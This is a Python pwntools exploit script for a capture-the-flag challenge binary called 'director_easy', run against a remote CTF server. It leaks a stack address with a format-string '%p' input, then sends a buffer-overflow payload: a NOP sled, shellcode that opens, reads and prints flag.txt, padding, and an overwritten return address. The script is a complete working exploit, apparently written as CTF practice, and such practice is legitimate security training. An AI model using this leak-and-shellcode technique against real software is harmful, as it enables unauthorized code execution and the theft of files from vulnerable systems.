from pwn import *

context.arch = 'amd64'

exe = './director_easy'
elf = ELF(exe)
context.binary = exe

#p = process(exe)
p = remote('challs.ctf.cert.unlp.edu.ar',43411)
print("--- Step 1: Leaking Stack Address ---")

# We send %p to get the first leaked address from the stack
p.sendlineafter(b'Input:', b'%p')
p.recvuntil(b'You entered:')

leak_str = p.recvline().strip().decode()
leaked_addr = int(leak_str, 16)

log.info(f"Leaked Add :{hex(leaked_addr)}")

# Calculate v4 Address based on GDB analysis(0x1b0 = 432)
offset_adj = 432
target = leaked_addr + offset_adj
log.success(f"Targeting shellcode at : {hex(target)}")

# --- SHELLCODE GENERATION ---

# 1. open('flag.txt', 0, 0)
# 2. read(rax, rsp, 100)  <- read file into stack
# 3. write(1, rsp, 100)   <- write stack to stdout
sc = asm(shellcraft.open('flag.txt') + 
         shellcraft.read('rax', 'rsp', 100) + 
         shellcraft.write(1, 'rsp', 100))

nop_sled_size = 100
nop_sled = b'\x90' * nop_sled_size

# Sending payload
offset = 280
payload = nop_sled + sc
padding_len = offset - len(payload)

if padding_len < 0:
    log.error("Payload too long! Reduce NOP sled size.")

payload += b'A' * padding_len
payload += p64(target)

p.sendlineafter(b'Input:', payload)
p.interactive()
